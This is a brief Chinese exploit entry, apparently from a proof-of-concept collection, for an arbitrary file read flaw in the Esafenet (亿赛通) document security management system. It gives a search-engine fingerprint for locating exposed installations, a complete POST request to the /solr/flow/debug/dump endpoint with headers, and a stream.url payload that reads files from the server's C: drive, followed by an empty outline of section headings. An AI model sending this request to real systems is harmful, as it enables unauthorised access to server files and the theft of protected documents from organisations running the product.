# 亿赛通电子文档安全管理系统dump存在任意文件读取漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1`
- **关键头**：`Host: 192.168.31.24:8090`　`Cookie: JSESSIONID=31E80EEC9EE4DC0835A362E81A9D179F`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 36`

**请求体 / payload**
```
stream.url=file:///C:\Program Files\
```

**其他**
- 亿赛通电子文档安全管理系统dump存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统